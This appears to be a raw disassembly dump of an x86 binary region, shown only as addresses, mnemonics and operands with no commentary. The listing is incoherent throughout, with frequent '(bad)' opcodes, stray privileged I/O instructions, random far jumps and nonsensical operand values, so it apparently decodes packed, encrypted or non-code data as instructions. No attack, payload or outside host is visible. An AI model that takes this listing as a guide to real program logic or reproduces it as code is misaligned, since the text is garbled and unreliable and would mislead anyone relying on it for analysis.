  41fcb1:	or     eax,0xbd28533c
  41fcb6:	cli    
  41fcb7:	push   ss
  41fcb8:	stos   BYTE PTR es:[edi],al
  41fcb9:	scas   al,BYTE PTR es:[edi]
  41fcba:	shr    BYTE PTR [ebp-0x16],cl
  41fcbd:	mov    ds:0xf32060ba,al
  41fcc2:	stos   BYTE PTR es:[edi],al
  41fcc3:	mov    edx,0xc5b447ca
  41fcc8:	ins    BYTE PTR es:[edi],dx
  41fcc9:	lds    ebx,FWORD PTR [edx]
  41fccb:	jae    0x41fd17
  41fccd:	pop    ebp
  41fcce:	adc    al,0xf
  41fcd0:	mov    WORD PTR [eax+0x1c],fs
  41fcd3:	fcom   QWORD PTR [esi-0x24c5320b]
  41fcd9:	inc    esi
  41fcda:	and    eax,0x29a808da
  41fcdf:	fwait
  41fce0:	stos   BYTE PTR es:[edi],al
  41fce1:	mov    DWORD PTR [ebx],ecx
  41fce3:	dec    eax
  41fce4:	jne    0x41fd47
  41fce6:	fimul  WORD PTR [ebx]
  41fce8:	cmp    bh,bl
  41fcea:	jae    0x41fc95
  41fcec:	pop    es
  41fced:	cwde   
  41fcee:	sbb    DWORD PTR [edx-0x41],0x32
  41fcf2:	test   DWORD PTR [ebx],esi
  41fcf4:	sub    BYTE PTR [ecx+0x62d7fc1b],al
  41fcfa:	in     eax,0xaf
  41fcfc:	xor    al,0x97
  41fcfe:	rcl    DWORD PTR [eax-0x2e],cl
  41fd01:	test   eax,0x447d4791
  41fd06:	inc    ebp
  41fd07:	mov    dh,0xa2
  41fd09:	mov    ebx,0xef1114af
  41fd0e:	inc    esp
  41fd0f:	cwde   
  41fd10:	(bad)  
  41fd12:	xor    cl,BYTE PTR [ebx+0x5f158d6f]
  41fd18:	push   esi
  41fd19:	sub    DWORD PTR [edi+0x2a],edi
  41fd1c:	retf   
  41fd1d:	sub    esi,edi
  41fd1f:	sahf   
  41fd20:	aad    0x1b
  41fd22:	mov    WORD PTR [eax-0x4059bf15],?
  41fd28:	push   0x4d67ad26
  41fd2d:	or     ecx,0x29c75a78
  41fd33:	les    edx,FWORD PTR [ebp+0x15]
  41fd36:	jns    0x41fd84
  41fd38:	cmp    DWORD PTR ds:0x67a99032,ecx
  41fd3e:	xor    ecx,DWORD PTR [esi+ecx*1]
  41fd41:	aad    0xee
  41fd43:	fldenv [ecx]
  41fd45:	cmp    bl,BYTE PTR [edi]
  41fd47:	rol    bh,cl
  41fd49:	sub    cl,al
  41fd4b:	in     al,dx
  41fd4c:	iret   
  41fd4d:	sti    
  41fd4e:	aam    0x27
  41fd50:	cld    
  41fd51:	outs   dx,BYTE PTR ds:[esi]
  41fd52:	mov    dl,0xbf
  41fd54:	adc    eax,0x2d7ee97d
  41fd59:	test   al,0x5e
  41fd5b:	sbb    esi,edi
  41fd5d:	xchg   esi,eax
  41fd5e:	adc    esi,DWORD PTR [ebx-0x66cb2bb4]
  41fd64:	int3   
  41fd65:	and    ah,dl
  41fd67:	cmp    bh,BYTE PTR ds:[eax+edx*4]
  41fd6b:	push   ebx
  41fd6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd6d:	ret    
  41fd6e:	push   ebp
  41fd6f:	or     eax,0x3485e5a9
  41fd74:	fistp  WORD PTR [esi-0x53]
  41fd77:	aad    0xe5
  41fd79:	add    dh,dl
  41fd7b:	push   edi
  41fd7c:	jl     0x41fdc7
  41fd7e:	test   eax,0x736ced42
  41fd83:	inc    edi
  41fd84:	add    eax,0x2d23554b
  41fd89:	stc    
  41fd8a:	ret    
  41fd8b:	in     al,dx
  41fd8c:	push   0xffffffa7
  41fd8e:	test   DWORD PTR [edx],edx
  41fd90:	add    BYTE PTR [edx-0x1d],dh
  41fd93:	out    0xb4,eax
  41fd95:	stc    
  41fd96:	adc    dl,BYTE PTR [edi+ebp*8+0x63]
  41fd9a:	mov    al,0x9a
  41fd9c:	sbb    ebp,ebp
  41fd9e:	hlt    
  41fd9f:	rcl    bh,0x3
  41fda2:	jl     0x41fd3c
  41fda4:	cmp    eax,0x24726b4e
  41fda9:	sbb    al,BYTE PTR [edi+edx*2]
  41fdac:	jnp    0x41fdc4
  41fdae:	jnp    0x41fdca
  41fdb0:	dec    esp
  41fdb1:	shr    DWORD PTR [esi],0xc1
  41fdb4:	add    eax,DWORD PTR [eax-0x64]
  41fdb7:	fidivr DWORD PTR [ebx]
  41fdb9:	push   cs
  41fdba:	jno    0x41fd64
  41fdbc:	mov    ecx,0xfabf45cc
  41fdc1:	cmp    al,0xc
  41fdc3:	test   eax,0x7e0190ac
  41fdc8:	mov    dl,bh
  41fdca:	fwait
  41fdcb:	pushf  
  41fdcc:	push   ss
  41fdcd:	xor    BYTE PTR ds:0x814e9fdc,al
  41fdd3:	mov    esi,0xf89ab988
  41fdd8:	not    DWORD PTR [ebp-0x74]
  41fddb:	clc    
  41fddc:	test   BYTE PTR [ebx],bl
  41fdde:	mov    dh,0x58
  41fde0:	popa   
  41fde1:	arpl   bx,bx
  41fde3:	jle    0x41fe14
  41fde5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fde6:	jae    0x41fdf4
  41fde8:	loop   0x41fe36
  41fdea:	xor    BYTE PTR [esi-0x6fd3156a],bh
  41fdf0:	cdq    
  41fdf1:	retf   
  41fdf2:	mov    esp,DWORD PTR [edi-0x59716f4c]
  41fdf8:	sub    DWORD PTR [ebx+0x32],edx
  41fdfb:	shr    eax,0x3f
  41fdfe:	inc    edi
  41fdff:	pop    edx
  41fe00:	mov    ebx,0x8dea0904
  41fe05:	(bad)  
  41fe06:	gs xchg edx,eax
  41fe08:	repnz add BYTE PTR ds:0x5ba68a01,cl
  41fe0f:	cwde   
  41fe10:	lds    esp,FWORD PTR [eax]
  41fe12:	pop    ecx
  41fe13:	or     ebp,esp
  41fe15:	inc    ebp
  41fe16:	sbb    eax,0x5e0f2e27
  41fe1b:	add    al,0x28
  41fe1d:	mov    cl,dh
  41fe1f:	int3   
  41fe20:	jmp    0x5138:0x1badb857
  41fe27:	xchg   BYTE PTR cs:[bx+di-0x59],bl
  41fe2c:	enter  0x4792,0x17
  41fe30:	imul   esp,DWORD PTR [eax+eax*2+0x3c],0x9dbf17ea
  41fe38:	xlat   BYTE PTR ds:[ebx]
  41fe39:	mov    edi,0x7e79b5
  41fe3e:	dec    edi
  41fe3f:	(bad)  
  41fe40:	daa    
  41fe41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe42:	push   0x744659e3
  41fe47:	pop    ebp
  41fe48:	ds sahf 
  41fe4a:	xor    al,bh
  41fe4c:	jp     0x41fe7f
  41fe4e:	dec    esp
  41fe4f:	jle    0x41feb1
  41fe51:	jg     0x41fe94
  41fe53:	in     eax,dx
  41fe54:	mov    DWORD PTR [ecx-0x706804bf],edx
  41fe5a:	push   esi
  41fe5b:	xor    ebx,DWORD PTR [ebx*8-0x68241bbe]
  41fe62:	sub    edx,esp
  41fe64:	ss enter 0x7a6f,0xb9
  41fe69:	push   esp
  41fe6a:	test   ch,ch
  41fe6c:	xor    DWORD PTR [ebx+0x3c],0xffffffd3
  41fe70:	popf   
  41fe71:	aaa    
  41fe72:	bound  eax,QWORD PTR [ecx-0x4ca90752]
  41fe78:	lahf   
  41fe79:	jge    0x41fe18
  41fe7b:	sub    BYTE PTR [esi],0xef
  41fe7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe7f:	jge    0x41fe25
  41fe81:	sbb    DWORD PTR [ebx+0x3b440a7f],edi
  41fe87:	jns    0x41fef2
  41fe89:	xor    eax,0xcefa8633
  41fe8e:	cld    
  41fe8f:	sbb    BYTE PTR [ebx],ch
  41fe91:	daa    
  41fe92:	mov    bl,BYTE PTR [edi]
  41fe94:	loope  0x41feb6
  41fe96:	call   0xb1bb:0xfcf2f636
  41fe9d:	push   eax
  41fe9e:	pop    esi
  41fe9f:	jle    0x41feff
  41fea1:	ja     0x41feab
  41fea3:	cmp    eax,0xcb0315e5
  41fea8:	push   DWORD PTR [edi-0x6a]
  41feab:	fdivr  st,st(6)
  41fead:	scas   al,BYTE PTR es:[edi]
  41feae:	aam    0xc9
  41feb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feb1:	and    al,BYTE PTR [ebx]
  41feb3:	lds    ebx,FWORD PTR [esi]
  41feb5:	xchg   BYTE PTR [eax-0x2073558e],bh
  41febb:	or     DWORD PTR [eax-0x238d4b08],esi
  41fec1:	fcomp  DWORD PTR [esi]
  41fec3:	dec    ecx
  41fec4:	pushf  
  41fec5:	jo     0x41ff2a
  41fec7:	(bad)  
  41fec8:	popa   
  41fec9:	pop    ebp
  41feca:	pusha  
  41fecb:	dec    ecx
  41fecc:	mov    cl,0x3a
  41fece:	test   eax,0x9906e1d0
  41fed3:	pop    es
  41fed4:	pop    ebx
  41fed5:	inc    ebx
  41fed6:	xchg   edx,eax
  41fed7:	add    eax,DWORD PTR [esi+0x2c99caa8]
  41fedd:	sub    DWORD PTR ds:0xd4a9e0a4,edx
  41fee3:	mov    DWORD PTR [eax-0xfa89c4d],0xb79ad344
  41feed:	jmp    0x41ff0f
  41feef:	jecxz  0x41fefb
  41fef1:	rol    BYTE PTR [edi],0x67
  41fef4:	sub    dl,BYTE PTR [edi-0x30]
  41fef7:	loopne 0x41ff03
  41fef9:	fwait
  41fefa:	dec    eax
  41fefb:	or     BYTE PTR [esi-0x1624a835],bl
  41ff01:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff03:	mov    ebx,DWORD PTR [ebp-0xe]
  41ff06:	mov    ?,eax
  41ff08:	sbb    esi,DWORD PTR [edx+0x44]
  41ff0b:	mov    ds:0xef9b4117,eax
  41ff10:	daa    
  41ff11:	dec    ebx
  41ff12:	xor    ebx,DWORD PTR [ecx]
  41ff14:	pusha  
  41ff15:	mov    ebx,?
  41ff17:	test   BYTE PTR [ecx+ebx*2-0x36],al
  41ff1b:	call   0x9f5b:0x998c1ed8
  41ff22:	inc    eax
  41ff23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff24:	js     0x41ff74
  41ff26:	mov    esi,0x7c4161a7
  41ff2b:	or     bl,dh
  41ff2d:	sbb    eax,0x95f28d63
  41ff32:	(bad)  
  41ff35:	mov    ebp,0x607f3d3a
  41ff3a:	push   ebx
  41ff3b:	jge    0x41ff7b
  41ff3d:	cld    
  41ff3e:	ins    DWORD PTR es:[edi],dx
  41ff3f:	jo     0x41ff87
  41ff41:	cmc    
  41ff42:	int3   
  41ff43:	rcl    DWORD PTR [ecx-0x37844cd],0xa4
  41ff4a:	out    0xec,eax
  41ff4c:	ds daa 
  41ff4e:	cmp    edi,DWORD PTR [edi+0x7e2aa38f]
  41ff54:	add    BYTE PTR [edx+0x4c6a12fb],cl
  41ff5a:	in     eax,dx
  41ff5b:	adc    DWORD PTR [ecx+0x1578bbac],0xffffffd1
  41ff62:	jecxz  0x41ff0c
  41ff64:	jns    0x41ff0d
  41ff66:	je     0x41ff15
  41ff68:	jne    0x41ffbe
  41ff6a:	and    esi,DWORD PTR [ebp+0x19c0ea8d]
  41ff70:	jge    0x41ffdd
  41ff72:	push   ebx
  41ff73:	pop    esi
  41ff74:	pop    ss
  41ff75:	jno    0x41ff37
  41ff77:	les    esi,FWORD PTR [ebp+ecx*2-0x3d]
  41ff7b:	fs jae 0x41ff54
  41ff7e:	(bad)  
  41ff7f:	cmp    DWORD PTR [esi],edx
  41ff81:	scas   eax,DWORD PTR es:[edi]
  41ff82:	inc    ebp
  41ff83:	test   eax,0x83d5a960
  41ff88:	push   ds
  41ff89:	cli    
  41ff8a:	pop    ds
  41ff8b:	pop    ds
  41ff8c:	lods   al,BYTE PTR ds:[esi]
  41ff8d:	ins    BYTE PTR es:[edi],dx
  41ff8e:	bound  ebp,QWORD PTR [edx+edx*4]
  41ff91:	icebp  
  41ff92:	jmp    0x41ff78
  41ff94:	mov    ch,0x6c
  41ff96:	lds    ebp,FWORD PTR [ebx+eax*1]
  41ff99:	xor    DWORD PTR [ecx],0x14
  41ff9c:	enter  0x810,0x1e
  41ffa0:	push   ebp
  41ffa1:	push   0x197ba62f
  41ffa6:	pop    edx
  41ffa7:	cmc    
  41ffa8:	push   cs
  41ffa9:	mov    ebx,0xcfe28e83
  41ffae:	mov    ah,0x89
  41ffb0:	cli    
  41ffb1:	ss mov dh,0x50
  41ffb4:	div    DWORD PTR [eax+eiz*4+0x8]
  41ffb8:	or     al,0x29
  41ffba:	loopne 0x41ffc7
  41ffbc:	push   cs
  41ffbd:	lods   eax,DWORD PTR ds:[esi]
  41ffbe:	jnp    0x41ff7f
  41ffc0:	mov    bl,al
  41ffc2:	and    al,0x28
  41ffc4:	mov    dh,0xcb
  41ffc6:	lock xchg edx,eax
  41ffc8:	mov    edx,0x9236c6aa
  41ffcd:	mov    ebx,DWORD PTR [edx]
  41ffcf:	(bad)  
  41ffd1:	popa   
  41ffd2:	push   ebx
  41ffd3:	fwait
  41ffd4:	stos   BYTE PTR es:[edi],al
  41ffd5:	rdmsr  
  41ffd7:	in     eax,dx
  41ffd8:	pop    eax
  41ffd9:	call   0xc15b6fa9
  41ffde:	sahf   
  41ffdf:	jb     0x41ff89
  41ffe1:	aas    
  41ffe2:	dec    ebp
  41ffe3:	stos   DWORD PTR es:[edi],eax
  41ffe4:	or     DWORD PTR [esi+edi*2+0x28e5a2df],eax
  41ffeb:	sub    DWORD PTR [edi],edi
  41ffed:	jg     0x42001d
  41ffef:	fsub   QWORD PTR [ebx+0x44]
  41fff2:	inc    ebp
  41fff3:	mov    ch,BYTE PTR [esi-0x1c8e5986]
  41fff9:	or     ah,BYTE PTR [edi-0x65]
  41fffc:	sbb    edx,esi
  41fffe:	inc    edi
  41ffff:	les    ebp,FWORD PTR [eax+eiz*8-0x481047ff]
  420006:	fsub   DWORD PTR [edx+ebx*2+0x2e]
  42000a:	(bad)  
  42000c:	ins    DWORD PTR es:[edi],dx
  42000d:	mov    ebp,0xcd372e4d
  420012:	sbb    eax,0x4c5a697d
  420017:	ss fwait
  420019:	jmp    0xba64:0x51c2152d
  420020:	lar    edx,WORD PTR ds:[edx-0xc40e2cb]
  420028:	ret    
  420029:	mov    ?,WORD PTR [ebp-0x12d1b5d4]
  42002f:	fcom   QWORD PTR [ebx-0x22]
  420032:	add    BYTE PTR [ecx-0x6d],ch
  420035:	adc    al,0x78
  420037:	mov    eax,0xae9245e6
  42003c:	pushf  
  42003d:	mov    bh,0x38
  42003f:	mov    edx,0xad6c5333
  420044:	leave  
  420045:	mov    ah,0x8b
  420047:	xchg   edi,eax
  420048:	dec    eax
  420049:	push   es
  42004a:	push   ds
  42004b:	pop    es
  42004c:	jmp    0x7dc75e58
  420051:	fcmovnbe st,st(0)
  420053:	daa    
  420054:	(bad)
  420057:	cmp    ch,BYTE PTR [eax-0x5f]
  42005a:	jae    0x420075
  42005c:	cmp    al,0x16
  42005e:	lods   eax,DWORD PTR ds:[esi]
  42005f:	xor    DWORD PTR [edi-0x17282e8f],eax
  420065:	imul   ecx,DWORD PTR [edx+0x38],0xd5da578a
  42006c:	aaa    
  42006d:	ja     0x420003
  42006f:	lea    ebx,[ebp-0x4f]
  420072:	push   ebx
  420073:	mov    cl,0x45
  420075:	lea    edx,[edi-0x11]
  420078:	mov    al,ds:0x1e280d45
  42007d:	js     0x42001b
  42007f:	cdq    
  420080:	mov    cl,0xc5
  420082:	sbb    al,0x52
  420084:	jmp    0xdc17:0x15cfd23b
  42008b:	sub    edi,ebp
  42008d:	jecxz  0x420101
  42008f:	idiv   eax
  420091:	add    BYTE PTR [ecx],0x27
  420094:	data16 mov dl,0x6f
  420097:	fsubr  DWORD PTR [edi]
  420099:	xlat   BYTE PTR ds:[ebx]
  42009a:	loopne 0x42005b
  42009c:	dec    eax
  42009d:	xchg   BYTE PTR [ebp+0x4a5c532a],bl
  4200a3:	(bad)  
  4200a4:	mov    eax,gs:0xa30709c8
  4200aa:	mov    ebp,0x3ec2eb3c
  4200af:	pop    esp
  4200b0:	or     DWORD PTR [eax],ecx
  4200b2:	xchg   DWORD PTR [esi+0x66faf281],edx
  4200b8:	popa   
  4200b9:	shl    DWORD PTR [edx],0xf8
  4200bc:	dec    esp
  4200bd:	out    0x16,eax
  4200bf:	icebp  
  4200c0:	mov    dl,0xf8
  4200c2:	xchg   ebp,eax
  4200c3:	pop    esi
  4200c4:	icebp  
  4200c5:	in     eax,0xb0
  4200c7:	ret    
  4200c8:	push   ds
  4200c9:	shr    BYTE PTR [ebp-0x28],0xa3
  4200cd:	mov    cl,0x66
  4200cf:	dec    edi
  4200d0:	mov    esp,0xc8ee457
  4200d5:	sbb    BYTE PTR [edi],al
  4200d7:	jbe    0x420140
  4200d9:	ins    DWORD PTR es:[edi],dx
  4200da:	cmp    eax,0x9e90a102
  4200df:	stos   BYTE PTR es:[edi],al
  4200e0:	call   0x1c23b144
  4200e5:	mov    cl,0xe6
  4200e7:	call   0xd102e086
  4200ec:	out    dx,al
  4200ed:	sar    DWORD PTR [eax+0x653fe9b1],1
  4200f3:	or     BYTE PTR [eax-0xc],bl
  4200f6:	jb     0x4200ed
  4200f8:	xchg   DWORD PTR [ebp-0x5],esi
  4200fb:	sar    DWORD PTR [esi-0x3c],1
  4200fe:	sbb    eax,0x8cb1a10d
  420103:	retf   
  420104:	push   edi
  420105:	mov    edi,0x34fe0371
  42010a:	stc    
  42010b:	jo     0x420172
  42010d:	mov    dh,ah
  42010f:	mov    edi,0xf4bd8b94
  420114:	icebp  
  420115:	je     0x420182
  420117:	push   ss
  420118:	push   esp
  420119:	sub    DWORD PTR ds:0xa95eabd2,edi
  42011f:	out    0xe8,eax
  420121:	push   esi
  420122:	cmp    dh,BYTE PTR [edi+ebp*8]
  420125:	mov    edi,0x933e53e9
  42012a:	imul   edx,DWORD PTR ds:0xcf580549,0xa12c6ec3
  420134:	sub    DWORD PTR [edi],edi
  420136:	dec    esi
  420137:	sub    BYTE PTR [ecx-0x70],0xc4
  42013b:	and    eax,0x61600672
  420140:	sub    esp,DWORD PTR [esp+esi*4+0xaf1bdca]
  420147:	sti    
  420148:	je     0x420163
  42014a:	adc    BYTE PTR [edx-0x1010acdd],ch
  420150:	arpl   WORD PTR [edi-0x673a2586],cx
  420156:	shr    dl,0x64
  420159:	sub    BYTE PTR [edx-0x2b2609e8],al
  42015f:	mov    ds:0x6a629e9f,al
  420164:	pop    edi
  420165:	cmp    al,0xe3
  420167:	cmp    ebp,DWORD PTR [ecx]
  420169:	mov    cl,0x13
  42016b:	push   0x14aa2f21
  420170:	pop    ebx
  420171:	sti    
  420172:	das    
  420173:	jbe    0x420149
  420175:	xor    DWORD PTR [edi+0x11],ebp
  420178:	icebp  
  420179:	fisttp WORD PTR [edi-0x1e]
  42017c:	popa   
  42017d:	and    dl,BYTE PTR [ebx+edx*2+0x78ab5ade]
  420184:	fcomp  DWORD PTR [eax-0x47ec675c]
  42018a:	xchg   edi,eax
  42018b:	loope  0x4201e7
  42018d:	cmp    eax,DWORD PTR gs:[eax-0x7ec46c48]
  420194:	add    ah,BYTE PTR [edi+0x5ae18c30]
  42019a:	or     BYTE PTR [ecx],0xf1
  42019d:	pusha  
  42019e:	pop    ds
  42019f:	lea    esi,[ebp-0x4b]
  4201a2:	in     al,dx
  4201a3:	cld    
  4201a4:	pusha  
  4201a5:	jb     0x420186
  4201a7:	mov    ds:0xedbd72d4,al
  4201ac:	fnstcw WORD PTR ds:0x70a0dadc
  4201b2:	sahf   
  4201b3:	jns    0x420156
  4201b5:	imul   ebp,edi,0xffffff8a
  4201b8:	mov    cl,0xd6
  4201ba:	scas   al,BYTE PTR es:[edi]
  4201bb:	xchg   ebx,eax
  4201bc:	xchg   DWORD PTR [esi],ebx
  4201be:	or     ecx,DWORD PTR [esi+0x793e2374]
  4201c4:	and    eax,0x9de72109
  4201c9:	(bad)  
  4201ca:	fldcw  WORD PTR [eax]
  4201cc:	mov    ds:0xc48ae462,al
  4201d1:	add    bl,ch
  4201d3:	mov    dh,0x21
  4201d5:	pusha  
  4201d6:	push   ebp
  4201d7:	sar    DWORD PTR [edi-0xe],0x81
  4201db:	adc    BYTE PTR [ebx],dl
  4201dd:	dec    edi
  4201de:	adc    ebp,ebx
  4201e0:	dec    ebp
  4201e1:	ss sti 
  4201e3:	arpl   di,dx
  4201e5:	fsubr  DWORD PTR [eax]
  4201e7:	neg    BYTE PTR [edx]
  4201e9:	(bad)
  4201ed:	in     al,dx
  4201ee:	sbb    DWORD PTR [ecx+0x76a65b6a],0xffffff81
  4201f5:	or     al,0x64
  4201f7:	xor    ebx,DWORD PTR [edx]
  4201f9:	fimul  WORD PTR [ecx]
  4201fb:	xchg   BYTE PTR [eax],bh
  4201fd:	fdiv   DWORD PTR [edi]
  4201ff:	mov    bl,0x77
  420201:	xlat   BYTE PTR ds:[ebx]
  420202:	pop    es
  420203:	xlat   BYTE PTR ds:[ebx]
  420204:	sbb    ebx,DWORD PTR [ecx+0x69]
  420207:	xlat   BYTE PTR ds:[ebx]
  420208:	cmp    edx,DWORD PTR [eax+0x432adfb0]
  42020e:	je     0x420191
  420210:	test   al,0x4c
  420212:	sub    ch,BYTE PTR [ecx+0x6a564fc0]
  420218:	arpl   sp,si
  42021a:	xor    BYTE PTR [esi],dh
  42021c:	mov    ebx,0xf4aef4f
  420221:	ret    
  420222:	pop    ds
  420223:	psllq  mm7,QWORD PTR [edi+0x6b]
  420227:	pop    ss
  420228:	xchg   ebx,eax
  420229:	dec    ebx
  42022a:	push   edx
  42022b:	test   al,0x6d
  42022d:	inc    eax
  42022e:	jo     0x42024b
  420230:	inc    edx
  420231:	(bad)  
  420233:	jge    0x420253
  420235:	jnp    0x420248
  420237:	outs   dx,BYTE PTR ds:[esi]
  420238:	mov    dl,ch
  42023a:	mov    ds:0xf7b4fc69,al
  42023f:	and    eax,0x672f36a9
  420244:	retf   0x6a78
  420247:	jmp    0x7cb22af0
  42024c:	cmc    
  42024d:	jno    0x4201da
  42024f:	popa   
  420250:	loopne 0x4202a2
  420252:	loop   0x4201dd
  420254:	arpl   WORD PTR [esi+edx*8-0x1317d876],bx
  42025b:	lock inc ecx
  42025d:	sub    eax,0x953403c5
  420262:	cmp    bh,bl
  420264:	adc    BYTE PTR [ecx],0x61
  420267:	mov    ecx,0x46c73bd0
  42026c:	add    esi,DWORD PTR [edx]
  42026e:	jecxz  0x420262
  420270:	cmp    DWORD PTR [edx+0xf],0xfffffff4
  420274:	mov    es,WORD PTR [ebp+0x4468f71c]
  42027a:	mov    ds:0x3dcb0ca3,eax
  42027f:	addr16 push esi
  420281:	outs   dx,DWORD PTR ds:[esi]
  420282:	aam    0x3
  420284:	mov    eax,ds:0x9148853f
  420289:	aad    0xe6
  42028b:	fbstp  TBYTE PTR [eax+0x1b]
  42028e:	jl     0x420303
  420290:	fisub  WORD PTR [ecx+esi*2-0x2771b7a3]
  420297:	jb     0x4202ee
  420299:	xchg   ebx,eax
  42029a:	jns    0x4202d4
  42029c:	outs   dx,BYTE PTR ds:[esi]
  42029d:	dec    edi
  42029e:	icebp  
  42029f:	dec    esi
  4202a0:	daa    
  4202a1:	test   al,0x6e
  4202a3:	xor    al,0x32
  4202a5:	inc    edx
  4202a6:	push   esp
  4202a7:	pop    esp
  4202a8:	rcr    bh,1
  4202aa:	push   0x49418f4c
  4202af:	cmp    dx,WORD PTR [edx-0x249b27f4]
  4202b6:	xchg   DWORD PTR [edx],ecx
  4202b8:	pop    esi
  4202b9:	frstor [esi+0x3a]
  4202bc:	push   eax
  4202bd:	repnz mov dh,0x65
  4202c0:	xchg   dx,ax
  4202c2:	adc    bl,bh
  4202c4:	add    DWORD PTR [edx],ebx
  4202c6:	cmp    dl,0xc
  4202c9:	mov    bl,0x17
  4202cb:	loop   0x420278
  4202cd:	adc    bl,BYTE PTR [ebx]
  4202cf:	and    BYTE PTR [esi+edi*4+0x1661b94],ch
  4202d6:	xchg   ebp,eax
  4202d7:	xlat   BYTE PTR ds:[ebx]
  4202d8:	in     al,dx
  4202d9:	punpckhdq mm1,QWORD PTR [edx+0x3d59952a]
  4202e0:	gs out dx,eax
  4202e2:	sbb    BYTE PTR [ebx-0x1a],ah
  4202e5:	imul   ebx,DWORD PTR [ebx],0x9b6077b3
  4202eb:	mov    ah,0x42
  4202ed:	jno    0x42032a
  4202ef:	sub    eax,0x282524ab
  4202f4:	ret    
  4202f5:	add    dh,BYTE PTR ds:0x3660808f
  4202fb:	pusha  
  4202fc:	jmp    0x47571eb
  420301:	pop    eax
  420302:	(bad)  
  420303:	push   ss
  420304:	fs mov ah,0x15
  420307:	cmc    
  420308:	jle    0x420290
  42030a:	mov    esi,0x52a0f5b5
  42030f:	push   edi
  420310:	dec    edi
  420311:	aad    0xb7
  420313:	fwait
  420314:	rol    cl,cl
  420316:	aaa    
  420317:	or     DWORD PTR [ebx+0x27],edx
  42031a:	scas   al,BYTE PTR es:[edi]
  42031b:	outs   dx,BYTE PTR ds:[esi]
  42031c:	jp     0x7279d3f6
  420322:	inc    ebp
  420323:	dec    esp
  420324:	mov    dl,0x8
  420326:	lds    esp,FWORD PTR [ecx]
  420328:	adc    DWORD PTR [edx],esp
  42032a:	std    
  42032b:	frstor [ecx-0x6545e7e6]
  420331:	jno    0x420309
  420333:	aas    
  420334:	adc    al,0x10
  420336:	push   esi
  420337:	mov    dl,0x7e
  420339:	pop    ebx
  42033a:	and    esp,eax
  42033c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42033d:	xlat   BYTE PTR ds:[ebx]
  42033e:	lock (bad) 
  420340:	push   eax
  420341:	je     0x4202ce
  420343:	mov    ah,0x8a
  420345:	in     al,0xaf
  420347:	jne    0x42030e
  420349:	in     al,dx
  42034a:	fidivr WORD PTR [ebx+0x14b3308e]
  420350:	leave  
  420351:	push   edx
  420352:	and    DWORD PTR [edx],0xf1599220
  420358:	(bad)  
  420359:	cmp    esp,esp
  42035b:	push   eax
  42035c:	repz adc eax,0xadc60162
  420362:	cmp    BYTE PTR [ecx+0x3840a652],dl
  420368:	mov    DWORD PTR [edx-0x765875dc],esp
  42036e:	sbb    BYTE PTR [ecx+0xdea1baa],dl
  420374:	shl    bl,cl
  420376:	sbb    bh,BYTE PTR [eax]
  420378:	xchg   edx,eax
  420379:	scas   eax,DWORD PTR es:[edi]
  42037a:	lahf   
  42037b:	or     ebx,0x72
  42037e:	xchg   ebp,eax
  42037f:	xchg   ebp,eax
  420380:	js     0x420317
  420382:	add    BYTE PTR [ecx],bl
  420384:	cmp    esp,0x1d
  420387:	nop
  420388:	test   DWORD PTR [edx+0x778095a8],0x65c366fd
  420392:	mov    dl,0x92
  420394:	pop    ecx
  420395:	cmp    ebp,ebx
  420397:	arpl   cx,ax
  420399:	sub    BYTE PTR [ebx+edi*1],ah
  42039c:	or     BYTE PTR [ebx+0x1a471aa],dh
  4203a2:	xchg   edx,eax
  4203a3:	dec    edx
  4203a4:	or     ecx,DWORD PTR [ebp+0x43]
  4203a7:	cdq    
  4203a8:	dec    edi
  4203a9:	mov    edi,0x45f95f9f
  4203ae:	aam    0xde
  4203b0:	or     BYTE PTR [esi-0x1eb89c2c],ah
  4203b6:	js     0x420409
  4203b8:	dec    eax
  4203b9:	cmp    eax,0x7b2e14c
  4203be:	mov    ds:0xf8d84ba4,al
  4203c3:	push   ebx
  4203c4:	jo     0x4203b2
  4203c6:	jmp    0x9692:0x39e820f3
  4203cd:	std    
  4203ce:	pop    ebx
  4203cf:	xchg   ebx,eax
  4203d0:	retf   0xe60e
  4203d3:	lds    edx,FWORD PTR [ecx]
  4203d5:	xor    BYTE PTR [ebx-0x394ce1b2],dh
  4203db:	push   esp
  4203dc:	lahf   
  4203dd:	retf   0x5596
  4203e0:	sub    DWORD PTR [ebp+eiz*4+0x7d],esp
  4203e4:	adc    dh,BYTE PTR [edi]
  4203e6:	(bad)  [eax+0x52f69d4]
  4203ec:	ins    BYTE PTR es:[edi],dx
  4203ed:	repz (bad) 
  4203ef:	std    
  4203f0:	call   0x1cc7:0xc5ea220
  4203f7:	jae    0x42040e
  4203f9:	out    0xc7,eax
  4203fb:	xor    ch,BYTE PTR fs:[ebx+0x4b683bc3]
  420402:	out    0xbe,eax
  420404:	xchg   edx,eax
  420405:	push   ecx
  420406:	inc    ebp
  420407:	jge    0x42038f
  420409:	jl     0x420447
  42040b:	call   0x4d124391
  420410:	push   ecx
  420411:	dec    edx
  420412:	imul   esp,DWORD PTR ds:0xb0a2199d,0x39
  420419:	or     edx,DWORD PTR [ebp+esi*1-0x14]
  42041d:	loope  0x420484
  42041f:	pop    esi
  420420:	xchg   edx,eax
  420421:	adc    eax,0x5015c5fb
  420426:	dec    eax
  420427:	in     eax,0xf8
  420429:	pop    ds
  42042a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42042b:	and    al,BYTE PTR [ecx]
  42042d:	stos   BYTE PTR es:[edi],al
  42042e:	arpl   WORD PTR [ecx+ecx*4],dx
  420431:	int    0x13
  420433:	ins    BYTE PTR es:[edi],dx
  420434:	test   eax,0xe53e3ed6
  420439:	or     eax,0x155f83d5
  42043e:	sub    DWORD PTR [esi],ebx
  420440:	ins    DWORD PTR es:[edi],dx
  420441:	push   es
  420442:	pop    ebp
  420443:	rcl    DWORD PTR [eax+0x1ca035af],cl
  420449:	sbb    al,0x5b
  42044b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42044c:	mov    BYTE PTR [eax+0x74],dl
  42044f:	retf   
  420450:	stos   DWORD PTR es:[edi],eax
  420451:	adc    BYTE PTR [ebp-0x35e5f023],bh
  420457:	sub    esi,ebp
  420459:	mov    ebp,0xbb66ce92
